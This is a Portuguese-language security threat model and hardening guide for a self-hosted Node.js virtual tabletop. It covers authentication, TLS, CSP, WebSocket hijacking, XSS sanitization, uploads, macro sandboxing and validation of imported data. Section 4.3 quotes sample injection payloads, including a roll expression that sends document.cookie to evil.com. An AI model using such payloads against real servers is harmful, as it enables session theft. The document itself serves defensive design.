# Fusion VTT — Modelo de Segurança: Threat Model e Guia de Defesa

**Documento:** `91-fusion-security-threat-model.md`
**Status:** Pesquisa base para spec
**Data:** 2026-06-11
**Escopo:** Servidor roda na máquina do GM; jogadores conectam via LAN/internet (navegador)

---

## 1. Contexto e Superfície de Ataque

O Fusion é um servidor Node.js que expõe:

- **HTTP/HTTPS** — entrega de assets estáticos, API REST de setup, uploads de arquivo
- **WebSocket (ws/wss)** — canal principal de jogo em tempo real
- **Porta única** (ex.: 30000) potencialmente aberta ao roteador via UPnP ou port-forwarding manual

O GM roda o servidor na sua máquina pessoal, o que significa que um RCE bem-sucedido compromete diretamente o computador do GM, não um servidor isolado em datacenter. Isso eleva drasticamente o impacto de qualquer vulnerabilidade.

### 1.1 Lições diretas do Foundry VTT

O Foundry VTT, referência mais próxima de arquitetura similar, acumulou vulnerabilidades documentadas:

| Vulnerabilidade                                                | Versões afetadas       | Impacto                                                     | Referência                                 |
| -------------------------------------------------------------- | ---------------------- | ----------------------------------------------------------- | ------------------------------------------ |
| Path traversal no nome do pacote (módulo install)              | < 0.7.10 / < 0.8.2     | Sobrescrita arbitrária de diretório → RCE via autostart     | catnip.fyi/posts/foundry-p1                |
| `getSetupData` WebSocket handler não autenticado               | < 0.7.10               | Vazamento de path de instalação, username, config de mundos | catnip.fyi/posts/foundry-p1                |
| Duas vulnerabilidades de RCE em Document modification workflow | < 13.351               | Execução de código arbitrário no servidor do GM             | PT-2025-138 / PT-2025-139 (CVSS 7.1 e 8.4) |
| Path traversal no file picker                                  | < 0.4.0                | Browse/upload fora do User Data permitido                   | Release 0.4.0                              |
| Vulnerabilidade em biblioteca WEBM/Chromium (Electron)         | Versões desatualizadas | RCE via browser engine                                      | Release notes Foundry                      |

**Impacto real:** Positive Technologies estimou ~120.000 servidores Foundry VTT expostos publicamente na internet no momento da divulgação em 2025. O modelo de ameaça do Fusion é idêntico.

---

## 2. Autenticação

### 2.1 Modelo atual do Foundry (referência comportamental)

O Foundry usa dois sistemas paralelos de senha:

1. **Admin Access Key** — protege a tela de Setup (`/setup`). Hashada e armazenada em `Config/admin.txt`. Se não configurada, o Setup fica aberto para qualquer pessoa na rede.
2. **Senha por mundo/por usuário** — cada usuário de um World pode ter uma senha. Sem senha, a conta fica acessível sem autenticação. Não é obrigatório configurar.

Problemas identificados no modelo do Foundry relevantes para o Fusion:

- Senhas opcionais são um vetor real: jogadores sem senha ficam sem proteção
- O endpoint de WebSocket de setup (`getSetupData`) vazou informações sem exigir autenticação (corrigido, mas o padrão é perigoso)
- Não há menção a rate-limiting nativo de tentativas de login
- Não há mecanismo de sessão expirada ou revogação de token em tempo real

### 2.2 Recomendações para o Fusion

#### 2.2.1 Hashing de senhas

Usar **Argon2id** para todas as senhas (Admin Key + senhas de usuários de mundo).

| Algoritmo         | Status 2026                              | Recomendação OWASP/NIST                                      |
| ----------------- | ---------------------------------------- | ------------------------------------------------------------ |
| **Argon2id**      | Ouro — vencedor do PHC 2015, memory-hard | **Recomendado para novos projetos**                          |
| bcrypt            | Seguro, estável desde 1999, 72 bytes max | Aceitável se Argon2 criar dependências nativas problemáticas |
| scrypt            | Memory-hard, mas menos suporte em audit  | Secundário                                                   |
| PBKDF2            | Iterativo sem memory-hardness            | Evitar para senhas                                           |
| SHA-\*/MD5 direta | Inseguro                                 | Nunca usar                                                   |

Parâmetros mínimos para Argon2id: `memory=65536 KiB (64 MB)`, `iterations=3`, `parallelism=4`.

Pacotes Node.js: `argon2` (bindings nativos, requer node-gyp) ou `@node-rs/argon2` (bindings Rust/NAPI, mais fácil de instalar).

#### 2.2.2 Modelo de sessão

**Abordagem recomendada:** Access token em memória (JS) + refresh token em cookie `httpOnly; Secure; SameSite=Strict`.

```
POST /auth/login
  → valida senha com Argon2id
  → emite JWT de access (exp: 15 min, assinado com chave HMAC/RS256)
  → emite refresh token opaco (UUID v4, armazenado no servidor/DB com hash)
  → seta cookie httpOnly com refresh token

WebSocket upgrade
  → client passa JWT no header Authorization: Bearer <token>
  → OU no cookie (para browser clients que não podem setar headers em WS upgrade)
  → server valida JWT antes de aceitar a conexão
  → timeout de 5s: se não autenticar após connect, fechar conexão

POST /auth/refresh
  → lê refresh token do cookie httpOnly
  → valida contra hash no servidor
  → emite novo access token + rotaciona refresh token (rotation + reuse detection)
```

**Por que NÃO usar o modelo de "senha por mundo" do Foundry sem sessão:**
O modelo Foundry transmite a senha a cada reconexão; não há conceito de token revogado. Uma sessão com JWT permite revogar acesso imediatamente (ex.: GM chutando jogador) sem reconfigurar o mundo.

#### 2.2.3 Rate limiting de login

Aplicar rate limiting **por IP + por username** (evitar user enumeration por comportamento diferencial):

```
5 tentativas falhas em 15 minutos → bloquear IP por 15 minutos
10 tentativas falhas em 1 hora → bloquear IP por 1 hora
Backoff exponencial após cada falha
```

Bibliotecas: `rate-limiter-flexible` (suporta in-process, Redis, PostgreSQL — escalável).

**Rate limiting de mensagens WebSocket:**

- Máximo de 50 mensagens/segundo por conexão (token bucket)
- Máximo de 10 novas conexões/minuto por IP
- Fechar conexões que excedam limites após 3 avisos

---

## 3. Exposição à Internet: TLS, Headers e CORS

### 3.1 TLS é obrigatório em produção

Usar `ws://` ou `http://` em produção expõe:

- Credenciais em texto claro (senhas, tokens)
- Replay attacks no WebSocket
- Downgrade attacks (strip TLS em redes adversariais)

**Modelo de implantação recomendado:** Reverse proxy (Caddy ou Nginx) na frente do servidor Node.js.

```
[Internet] → [Caddy/Nginx HTTPS :443 + WSS] → [Fusion HTTP :3000 loopback]
```

Vantagens:

- Caddy renova certificados Let's Encrypt automaticamente
- O processo Fusion roda sem privilégios de root (não precisa bind em :443)
- O reverse proxy pode aplicar rate limiting, headers de segurança e logs centralizados
- Fusion configura `proxySSL: true` e `proxyPort: 443` para gerar invitation links corretos

Configuração mínima de Nginx (modelo de segurança para o Fusion):

```nginx
# TLS
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:...;
ssl_session_cache shared:SSL:10m;
ssl_stapling on;

# Headers de segurança
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# CSP — ver seção 3.2
add_header Content-Security-Policy "..." always;

# Rate limiting
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
limit_req zone=login burst=3 nodelay;
```

### 3.2 Content Security Policy (CSP)

Um VTT apresenta desafios únicos para CSP porque:

- Carrega assets (imagens, fontes) de caminhos arbitrários escolhidos pelo usuário
- Executa inline rolls (JS no cliente) via macros
- Módulos de terceiros injetam scripts legítimos

**CSP mínimo para o Fusion (pode precisar de relaxamento por feature):**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_PER_REQUEST}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:;
  font-src 'self' data:;
  connect-src 'self' wss://;
  media-src 'self' blob:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
```

**Nonces:** Gerar um nonce criptograficamente aleatório por request HTTP e injetá-lo nos `<script>` tags. Nunca usar nonce estático hardcoded. Usar `unsafe-inline` como fallback apenas durante desenvolvimento.

**Problema prático com módulos de terceiros:** Módulos legítimos injetam scripts dinamicamente. O Fusion precisa de uma estratégia para permitir que módulos carreguem scripts sem desabilitar CSP inteiramente. Opções:

- Listar hashes SHA-256 dos scripts conhecidos (`'sha256-...'`)
- Usar uma `script-src` que permite apenas origens conhecidas do host local

### 3.3 CORS

Para requisições HTTP REST (API):

- `Access-Control-Allow-Origin`: apenas a própria origem ou `null` para requests locais
- Nunca `*` para endpoints autenticados
- `Access-Control-Allow-Credentials: true` apenas combinado com origem explícita

Para WebSocket: CORS não se aplica da mesma forma (browsers não enviam CORS preflight em WS upgrade), mas o Cross-Site WebSocket Hijacking (CSWSH) é o vetor equivalente — ver seção 3.4.

### 3.4 Cross-Site WebSocket Hijacking (CSWSH)

**Mecanismo:** Um site malicioso pode abrir uma conexão WebSocket para `wss://meu-vtt.example.com` usando cookies da sessão da vítima (browsers enviam cookies automaticamente no upgrade). Isso bypassa a Same-Origin Policy porque WebSockets não a respeitam.

**Mitigações obrigatórias:**

1. **Validar o header `Origin`** no handshake de upgrade. Rejeitar conexões de origens não permitidas com HTTP 403.
2. **Combinar com token explícito** no handshake (ex.: JWT no query string ou header custom) — tokens não são enviados automaticamente pelo browser, logo um site malicioso não consegue obtê-los.
3. **Cookies `SameSite=Strict`** impedem o envio automático de cookies em requests cross-origin.

```javascript
// Exemplo de validação de origin no upgrade
server.on("upgrade", (request, socket, head) => {
  const origin = request.headers["origin"];
  const allowedOrigins = getAllowedOrigins(); // config carregada em runtime
  if (!allowedOrigins.includes(origin)) {
    socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
    socket.destroy();
    return;
  }
  // continuar com autenticação JWT...
});
```

---

## 4. Sanitização de Conteúdo HTML (XSS)

### 4.1 Superfícies de ataque de XSS no Fusion

O Fusion, como qualquer VTT, exibe HTML rico em múltiplos contextos:

| Superfície              | Origem do conteúdo           | Risco                                                                |
| ----------------------- | ---------------------------- | -------------------------------------------------------------------- |
| Chat messages           | Qualquer jogador autenticado | Alto — HTML enriquecido com inline rolls                             |
| Journal entries         | GM / módulos / compendiums   | Médio — conteúdo controlado pelo GM mas importado de fontes externas |
| Item/Actor descriptions | Compendiums, sistema pf2e    | Médio — JSON importado de OGL/ORC                                    |
| Macro output            | Jogadores com permissão      | Alto — resultado de execução JS                                      |
| Nomes de tokens/cenas   | GM                           | Baixo — texto curto                                                  |
| Tooltips / enrichers    | Resolvidos pelo TextEditor   | Médio — input do usuário passado por regex                           |

### 4.2 DOMPurify como camada obrigatória

**DOMPurify** é o padrão-ouro para sanitização HTML no browser:

- Desenvolvido e auditado pela cure53 (Berlin)
- ~7 milhões de downloads semanais
- DOM-based: usa o próprio parser HTML do browser, evita falsos negativos de regex

**Nota de CVE recente:** CVE-2025-26791 — vulnerabilidade em template literals em regex em versões específicas do DOMPurify. Manter sempre na versão mais recente. Monitorar `GHSA-*` no repositório do DOMPurify.

**Regra de defesa em profundidade (dupla sanitização):**

- **Server-side:** Sanitizar com `sanitize-html` (Node.js) antes de persistir no banco de dados
- **Client-side:** Sanitizar com `DOMPurify` antes de injetar no DOM

```javascript
// Server-side — ao receber mensagem de chat
import sanitizeHtml from "sanitize-html";

const cleanContent = sanitizeHtml(rawInput, {
  allowedTags: [
    "b",
    "i",
    "em",
    "strong",
    "a",
    "span",
    "p",
    "br",
    "ul",
    "ol",
    "li",
    "h1",
    "h2",
    "h3",
  ],
  allowedAttributes: {
    a: ["href", "data-uuid"],
    span: ["class", "data-roll"],
  },
  allowedSchemes: ["https", "http"],
  // Proibir javascript: e data: em href/src
});

// Client-side — antes de inserir no DOM
import DOMPurify from "dompurify";

const safeHTML = DOMPurify.sanitize(serverContent, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "span", "p", "br"],
  ALLOWED_ATTR: ["href", "class", "data-uuid", "data-roll"],
  FORBID_ATTR: ["style", "onerror", "onload"],
  FORCE_BODY: true,
});
element.innerHTML = safeHTML;
```

### 4.3 Enrichers e inline rolls

O Foundry processa padrões como `[[2d6+3]]`, `@UUID[Actor.xxx]{Nome}`, `@Check[...]` antes de renderizar HTML. Esses **enrichers** são um vetor de injeção se não processados corretamente:

**Vetores de ataque em enrichers:**

- `@UUID[<script>alert(1)</script>]{texto}` — se o UUID não for validado antes de ser inserido no DOM
- `[[constructor.constructor('fetch("evil.com/"+document.cookie)')()')]]` — se expressões de roll avaliarem JS arbitrário
- Path traversal via UUID que referencia compendiums externos

**Defesa:**

1. **Validar formato do UUID antes de processar**: UUID deve ser `[A-Za-z]+\.[A-Za-z0-9_-]{16}` ou similar — nunca aceitar strings arbitrárias como UUID
2. **Sandboxar a avaliação de expressões de roll**: usar um parser de expressão matemática dedicado (ex.: `mathjs` com escopo restrito), nunca `eval()`
3. **Sanitizar o output do enricher** antes de injetar no DOM, mesmo após o processamento

---

## 5. Path Traversal e Segurança de Uploads

### 5.1 Histórico do Foundry

O Foundry corrigiu path traversal no file picker em 0.4.0 e no instalador de módulos em 0.7.10/0.8.2. A raiz do problema em ambos os casos: usar diretamente strings fornecidas pelo cliente na construção de paths de sistema de arquivos.

### 5.2 Regras para o Fusion

**Regra 1 — Nunca usar o nome original do arquivo diretamente:**

```javascript
// ERRADO
const filePath = path.join(UPLOAD_DIR, req.file.originalname);

// CORRETO
import crypto from "crypto";
const safeFilename =
  crypto.randomBytes(16).toString("hex") + path.extname(req.file.originalname).toLowerCase();
const filePath = path.join(UPLOAD_DIR, safeFilename);
```

**Regra 2 — Validar extensão E magic bytes (não confiar no MIME do client):**

```javascript
import { fileTypeFromBuffer } from "file-type";

const ALLOWED_TYPES = new Map([
  ["image/jpeg", [".jpg", ".jpeg"]],
  ["image/png", [".png"]],
  ["image/webp", [".webp"]],
  ["image/gif", [".gif"]],
  ["audio/ogg", [".ogg"]],
  ["audio/mpeg", [".mp3"]],
  ["video/webm", [".webm"]],
  ["application/pdf", [".pdf"]],
]);

const detectedType = await fileTypeFromBuffer(fileBuffer);
const reportedExt = path.extname(originalName).toLowerCase();

if (
  !detectedType ||
  !ALLOWED_TYPES.has(detectedType.mime) ||
  !ALLOWED_TYPES.get(detectedType.mime).includes(reportedExt)
) {
  throw new SecurityError("Tipo de arquivo não permitido");
}
```

**Regra 3 — Normalizar e confirmar que o path final está dentro do diretório permitido:**

```javascript
const resolvedPath = path.resolve(UPLOAD_DIR, safeFilename);
if (!resolvedPath.startsWith(path.resolve(UPLOAD_DIR))) {
  throw new SecurityError("Path traversal detectado");
}
```

**Regra 4 — Separar diretórios por permissão de papel:**

| Diretório         | Quem pode escrever                       | Notas                      |
| ----------------- | ---------------------------------------- | -------------------------- |
| `assets/public/`  | GM e usuários "Trusted" (se configurado) | Servido estaticamente      |
| `assets/modules/` | Apenas processo de instalação do sistema | Não editável por usuários  |
| `data/worlds/`    | Apenas o servidor (nunca upload direto)  | Dados de jogo estruturados |
| `Config/`         | Apenas CLI/processo local                | Nunca exposto via HTTP     |

**Regra 5 — Limitar tamanho de arquivo:**

- Assets de imagem: máximo 10 MB
- Audio: máximo 50 MB
- Video: máximo 200 MB
- Quota por usuário configurável

---

## 6. Sandbox de Macros

### 6.1 O problema

Macros de script no VTT executam JavaScript fornecido pelo usuário. No Foundry, o código de macro executa diretamente no contexto da página (browser), com acesso total à API do Foundry e ao DOM. A "sandbox" é apenas a permissão RBAC do usuário — se o usuário tem a permissão `MACRO_SCRIPT`, ele tem execução JS praticamente irrestrita no browser.

**No contexto do Fusion**, isso significa:

- Uma macro maliciosa pode fazer `fetch()` para endpoints do servidor usando as credenciais do GM
- Pode exfiltrar dados de outros usuários via side-channels
- Pode modificar o DOM para criar phishing visual

### 6.2 Estado do ecossistema de sandboxes JS (2025-2026)

| Abordagem                  | Status                                                   | Avaliação                                                                         |
| -------------------------- | -------------------------------------------------------- | --------------------------------------------------------------------------------- |
| `node:vm`                  | NÃO é sandbox real                                       | Trivialmente escapável — nunca usar para código não confiável                     |
| `vm2`                      | Histórico ruim, abandonado em 2023, ressuscitado em 2025 | Acumulou 20+ escapes conhecidos; maintainer mesmo desaconselha para código hostil |
| `isolated-vm`              | V8 Isolates reais, manutenção ativa                      | Melhor opção server-side; OOM pode crashar processo                               |
| `QuickJS WASM`             | JS engine separada compilada em WASM                     | Isolamento forte; sintaxe ES moderna pode ser incompleta; overhead                |
| Web Worker (browser)       | Isolamento de heap, sem acesso ao DOM                    | Bom para macros no browser; pode fazer fetch() — precisa de política de rede      |
| `iframe sandbox` (browser) | CSP + `sandbox` attribute                                | Pode bloquear acesso à API do Foundry se muito restrito                           |

### 6.3 Recomendação para o Fusion

**Arquitetura de dois níveis:**

**Nível 1 — Macros de "chat" (baixo privilégio, execução no browser):**

- Executar em um Web Worker isolado
- O Worker recebe uma API serializada (não referências vivas a objetos do Foundry)
- O Worker não tem acesso ao DOM, ao `document`, nem ao `window` principal
- Comunicação apenas via `postMessage` com validação de schema

```javascript
// Macro executa em Worker isolado
const worker = new Worker("/sandbox-worker.js", { type: "module" });
worker.postMessage({
  type: "EXEC_MACRO",
  code: macroCode,
  context: serializeContext(actor, token), // snapshot, não referência viva
});
worker.addEventListener("message", (e) => {
  if (e.data.type === "RESULT") applyMacroResult(e.data.payload);
  if (e.data.type === "ERROR") displayError(e.data.message);
});
// Timeout: matar Worker após 5 segundos
setTimeout(() => worker.terminate(), 5000);
```

**Nível 2 — Macros de "GM Script" (alto privilégio, execução no servidor via `executeAsGM`):**

- Usar `isolated-vm` no servidor para sandboxar a execução
- Whitelist de APIs disponíveis (operações de Document, sem acesso a `fs`, `net`, `child_process`)
- Timeout configurável (padrão: 10 segundos)
- Log de toda execução com conteúdo da macro e usuário solicitante

### 6.4 O padrão socketlib / executeAsGM

O padrão `executeAsGM` do socketlib é um vetor de **privilege escalation** se não validado corretamente:

**Como funciona o risco:**

1. Jogador (Player) chama `socket.executeAsGM('executarFuncao', payload)`
2. A função é executada no browser do GM com permissões de GM
3. Se `executarFuncao` não validar o `payload`, um jogador malicioso pode passar parâmetros inesperados

**Regras de defesa para qualquer função registrada como executável remotamente:**

1. **Whitelist de ações**: Nunca registrar funções genéricas que aceitam "qualquer ação". Cada função registrada deve ter um propósito específico.
2. **Validar payload com Zod** antes de qualquer operação
3. **Revalidar permissões no servidor**: A execução no GM não implica que o jogador tem permissão para o efeito pretendido — revalidar se o jogador de origem tem permissão para aquela operação específica
4. **Rate limit por usuário** em chamadas executeAsGM

```javascript
// Exemplo de função segura registrada como executeAsGM
import { z } from 'zod';

const HealSchema = z.object({
  actorId: z.string().regex(/^[A-Za-z0-9]{16}$/),
  amount: z.number().int().positive().max(999),
  requesterId: z.string(),
});

async function healActor(payload: unknown) {
  const data = HealSchema.parse(payload); // lança ZodError se inválido
  const actor = game.actors.get(data.actorId);
  if (!actor) throw new Error('Actor not found');

  // Revalidar: o requester tem permissão para curar este actor?
  const requester = game.users.get(data.requesterId);
  if (!requester.can('ACTOR_MODIFY') && !actor.hasPlayerOwner(requester)) {
    throw new Error('Permission denied');
  }

  await actor.applyDamage(-data.amount);
}
```

---

## 7. Validação de Dados Importados (Rule Elements e Compendiums)

### 7.1 O vetor

O sistema pf2e usa `system.rules` (Rule Elements) — arrays de objetos JSON que disparam lógica durante a preparação de dados de atores. Exemplos:

```json
{
  "key": "FlatModifier",
  "selector": "perception",
  "value": 2,
  "predicate": ["feature:darkvision"]
}
```

Ao importar compendiums de terceiros (não os OGL oficiais do repositório `foundryvtt/pf2e`), esses objetos podem conter:

- Chaves inválidas que disparam comportamento inesperado
- Valores de `value` sendo strings que avaliam expressões (`@actor.system.attributes.hp.value * 100`)
- Referências circulares que causam loops infinitos na preparação de dados
- Seletores que modificam dados privados de outros usuários

### 7.2 Estratégia de validação

**Validação de schema antes de persistir (Zod + Fastify):**

```typescript
import { z } from "zod";

// Schema de um Rule Element genérico
const RuleElementSchema = z
  .object({
    key: z.enum([
      "FlatModifier",
      "ActiveEffectLike",
      "TokenName",
      "DamageAlteration",
      // ... enum exaustivo das chaves válidas do sistema
    ]),
    selector: z
      .string()
      .max(128)
      .regex(/^[a-z.:-]+$/i),
    value: z.union([
      z.number(),
      z.string().max(256), // expressões permitidas
    ]),
    predicate: z.array(z.string().max(64)).max(20).optional(),
    label: z.string().max(256).optional(),
  })
  .strict(); // .strict() rejeita chaves desconhecidas

const ItemSchema = z.object({
  name: z.string().max(256),
  type: z.enum(["weapon", "armor", "feat", "spell" /* ... */]),
  system: z.object({
    rules: z.array(RuleElementSchema).max(50),
    // demais campos do sistema
  }),
});
```

**Sandboxar a avaliação de expressões em `value`:**

- Expressões como `@actor.system.attributes.hp.value` devem ser processadas por um parser dedicado (AST), não por `eval()` ou `new Function()`
- Whitelist de operadores: `+`, `-`, `*`, `/`, `floor()`, `ceil()`, `max()`, `min()`
- Blacklist de propriedades: acesso a `__proto__`, `constructor`, `prototype`
- Profundidade máxima de acesso a propriedades: 4 níveis

**Importação de compendiums:**

1. Aplicar validação de schema em cada item/actor antes de persistir
2. Rejeitar (e logar) itens com Rule Elements inválidos — não silenciar erros
3. Para compendiums externos (não oficiais), exibir aviso ao GM e requerer confirmação explícita
4. Considerar "modo quarentena": importar sem ativar Rule Elements até revisão do GM

### 7.3 Aviso sobre `new Function()` no Fastify/Ajv

O Fastify usa `ajv` internamente e `ajv` usa `new Function()` para compilar schemas em funções de validação. **Nunca expor o JSON de schema como entrada de usuário** — schemas são código de aplicação, não dados do usuário.

---

## 8. Matriz de Ameaças OWASP Aplicada ao Fusion

Baseado no OWASP Top 10:2025:

| #   | Categoria OWASP 2025      | Manifestação no Fusion                                                                                     | Mitigação                                                                                         |
| --- | ------------------------- | ---------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| A01 | Broken Access Control     | executeAsGM sem revalidação de permissão; CSWSH; endpoints de setup sem auth                               | Validação de permissão server-side; Origin header; autenticação obrigatória em todos os endpoints |
| A02 | Security Misconfiguration | Admin Key não configurada; `ws://` sem TLS; CORS aberto; UPnP expondo porta                                | Wizard de primeiro uso obrigando configuração; HTTPS por padrão; CSP                              |
| A03 | Injection                 | XSS em chat/journal; path traversal em uploads; eval() em roll expressions; Rule Elements injetando código | DOMPurify + sanitize-html; path resolve validation; parser matemático dedicado; Zod schemas       |
| A04 | Insecure Design           | Macros com acesso irrestrito ao DOM; executeAsGM como proxy genérico                                       | Arquitetura de Worker sandboxado; whitelist de ações remotas                                      |
| A05 | Security Misconfiguration | Headers de segurança ausentes; CSP não configurada; cookies sem flags                                      | Middleware que injeta headers; configuração testada em CI                                         |
| A06 | Vulnerable Components     | vm2 com histórico de escapes; DOMPurify desatualizado; Electron/Chromium com CVEs                          | Pinning de versões; Dependabot; monitorar GHSA                                                    |
| A07 | Auth Failures             | Senhas sem rate limit; sessões não expiram; refresh tokens sem rotação                                     | Argon2id + rate-limiter-flexible; JWT com exp curto; refresh rotation                             |
| A08 | Software Integrity        | Módulos de terceiros sem verificação; compendiums com Rule Elements maliciosos                             | Checksums de módulos; validação de schema na importação                                           |
| A09 | Logging Failures          | Ausência de logs de auth falhos; macros executadas sem rastreabilidade                                     | Log estruturado de todas as auth failures; log de execução de macros com user/timestamp           |
| A10 | SSRF                      | Fetch de manifests de módulos a URLs arbitrárias (vetor histórico do Foundry)                              | Validar domínio antes de fetch; allowlist opcional de registries; timeout curto                   |

---

## 9. Configuração de Segurança na Inicialização

### 9.1 Wizard obrigatório de primeiro uso

Na primeira inicialização, o Fusion deve:

1. Gerar um Admin Key aleatório (32 bytes hex) e exibir ao GM
2. Exibir aviso se o servidor não estiver atrás de TLS
3. Configurar automaticamente UPnP como **desabilitado por padrão** (opt-in explícito)
4. Mostrar checklist de segurança com status (verde/vermelho):
   - Admin Key configurada?
   - TLS habilitado?
   - Rate limiting ativo?
   - Porta exposta apenas via proxy?

### 9.2 Configurações no `options.json` relevantes para segurança

```json
{
  "port": 30000,
  "adminKey": "<hash argon2id>",
  "proxySSL": true,
  "proxyPort": 443,
  "upnp": false,
  "rateLimiting": {
    "loginMaxAttempts": 5,
    "loginWindowSeconds": 900,
    "wsMessagesPerSecond": 50,
    "wsConnectionsPerMinutePerIP": 10
  },
  "allowedOrigins": ["https://meu-vtt.example.com"],
  "uploadMaxSizeMB": {
    "image": 10,
    "audio": 50,
    "video": 200
  }
}
```

---

## 10. Checklist de Implementação (para os Desenvolvedores)

### Autenticação

- [ ] Argon2id para todas as senhas (Admin Key + usuários de mundo)
- [ ] JWT access token (exp: 15 min) + refresh token em cookie httpOnly
- [ ] Rotação de refresh token a cada renovação + detecção de reuso
- [ ] Rate limiting de login: 5 tentativas / 15 min por IP+username
- [ ] Rate limiting de WebSocket: 50 msg/s por conexão, 10 novas conexões/min por IP
- [ ] Timeout de autenticação pós-connect: 5 segundos
- [ ] Validação de `Origin` header no WebSocket upgrade (CSWSH)

### TLS e Headers

- [ ] Documentação e configuração de exemplo para Caddy e Nginx
- [ ] Middleware de headers: HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy
- [ ] CSP com nonce por request (não `unsafe-inline` em produção)
- [ ] `connect-src` da CSP incluindo `wss://` explicitamente

### Sanitização

- [ ] `sanitize-html` no servidor antes de persistir chat e journal
- [ ] `DOMPurify` no cliente antes de inserir no DOM
- [ ] UUID enricher: validar formato com regex antes de processar
- [ ] Roll expressions: parser matemático (mathjs restrito), nunca `eval()`

### Uploads e Assets

- [ ] Renomear arquivos para random hex + extensão detectada
- [ ] Validar magic bytes com `file-type` (não confiar no MIME do client)
- [ ] `path.resolve()` + confirmação que o path está dentro do UPLOAD_DIR
- [ ] Cotas por usuário e por role
- [ ] Diretórios segregados por nível de permissão

### Macros e executeAsGM

- [ ] Macros de chat executam em Web Worker (sem acesso ao DOM principal)
- [ ] Timeout de 5s em execução de macros
- [ ] Log de toda execução de macro (usuário, timestamp, primeiros 500 chars do código)
- [ ] Funções registradas como executeAsGM: Zod schema + revalidação de permissão
- [ ] Rate limit de chamadas executeAsGM por usuário

### Importação de Dados

- [ ] Zod schema para cada tipo de item/actor/scene antes de persistir
- [ ] `.strict()` nos schemas para rejeitar chaves desconhecidas
- [ ] Expressões em Rule Elements: AST parser com whitelist de operadores
- [ ] Aviso ao GM ao importar compendiums de fontes não-oficiais
- [ ] Nunca usar `new Function()` com dados de usuário

### Logging e Monitoração

- [ ] Log estruturado (JSON) de todas as falhas de autenticação
- [ ] Log de tentativas de path traversal (detectadas) com IP e payload
- [ ] Log de execuções de macro (GM e Player)
- [ ] Métricas de rate limiting expostas para o GM no painel de admin

---

## Fontes

- [catnip.fyi — Foundry VTT Unauthenticated RCE Part 1: Dir Overwrite](https://catnip.fyi/posts/foundry-p1/)
- [Positive Technologies — Foundry Gaming Security Improvement](https://global.ptsecurity.com/en/about/news/foundry-gaming-has-improved-the-security-of-its-gaming-platform-using-pt/)
- [Foundry VTT Release 13.351 — RCE security fix](https://foundryvtt.com/releases/13.351)
- [Foundry VTT — Application Configuration (SSL, proxySSL)](https://foundryvtt.com/article/configuration/)
- [Foundry VTT — TLS and HTTPS documentation](https://foundryvtt.com/article/ssl/)
- [Foundry VTT — Users and Permissions](https://foundryvtt.com/article/users/)
- [Foundry VTT — GitHub Issue #4462: Deprecate Access Keys in favor of hashed passwords](https://github.com/foundryvtt/foundryvtt/issues/4462)
- [Foundry VTT — GitHub Issue #11210: Prevent Script Macro creation without MACRO_SCRIPT permission](https://github.com/foundryvtt/foundryvtt/issues/11210)
- [socketlib README (farling42/foundryvtt-socketlib)](https://github.com/farling42/foundryvtt-socketlib/blob/master/README.md)
- [pf2e Rule Elements Quickstart Guide (foundryvtt/pf2e Wiki)](https://github.com/foundryvtt/pf2e/wiki/Quickstart-guide-for-rule-elements)
- [WebSocket.org — Security Guide (Auth, TLS, CSWSH, Rate Limiting)](https://websocket.org/guides/security/)
- [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [OWASP Top 10:2025 Introduction](https://owasp.org/Top10/2025/0x00_2025-Introduction/)
- [DOMPurify GitHub (cure53)](https://github.com/cure53/dompurify)
- [Snyk — CVE-2025-26791 DOMPurify XSS](https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251)
- [DEV.to — node:vm Is Not a Sandbox](https://dev.to/dendrite_soup/nodevm-is-not-a-sandbox-stop-using-it-like-one-2f74)
- [isolated-vm GitHub (laverdet)](https://github.com/laverdet/isolated-vm)
- [The Hacker News — Critical vm2 Flaw Allows Sandbox Escape (2026)](https://thehackernews.com/2026/01/critical-vm2-nodejs-flaw-allows-sandbox.html)
- [PkgPulse — Password Hashing 2026: bcrypt vs Argon2 vs scrypt](https://www.pkgpulse.com/guides/bcrypt-vs-argon2-vs-scrypt-password-hashing-2026)
- [Christian Schneider — Cross-Site WebSocket Hijacking (CSWSH)](https://christian-schneider.net/blog/cross-site-websocket-hijacking/)
- [Fastify — Validation and Serialization](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization/)
- [node-rate-limiter-flexible (animir)](https://github.com/animir/node-rate-limiter-flexible)
- [Self-Hosting Foundry VTT (vertner.net)](https://vertner.net/post/self-hosting-foundry-virtual-tabletop/)
- [Foundry VTT Release 0.4.0 — Path traversal fix](https://foundryvtt.com/releases/4.55)
- [Furkanbaytekin.dev — Accepting Files: MIME, Extensions, Path Traversal and Quotas](https://furkanbaytekin.dev/blogs/accepting-files-on-the-backend-mime-extensions-path-traversal-and-quotas-explained)
